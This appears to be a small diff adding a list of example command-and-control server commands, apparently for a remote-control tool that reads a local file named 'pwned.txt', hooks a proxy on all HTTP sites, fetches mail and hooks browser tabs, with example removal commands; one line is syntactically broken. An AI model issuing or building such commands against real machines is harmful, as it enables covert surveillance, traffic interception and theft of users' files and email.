@@ -1,0 +1,8 @@
+## Commands list for C&C server example:
+["fs", "get", ["d:\\temp\\pwned.txt"]]
+["proxy", "hook", ['site', 'http://*/*']],
+["mail", "get", []],
+["tabs", "hook" ["add"]],
+## Example remove command: 
+## ["proxy", "hook", ['rm', 'http://*/*']]
+## ["tabs", "hook", ["add"]]
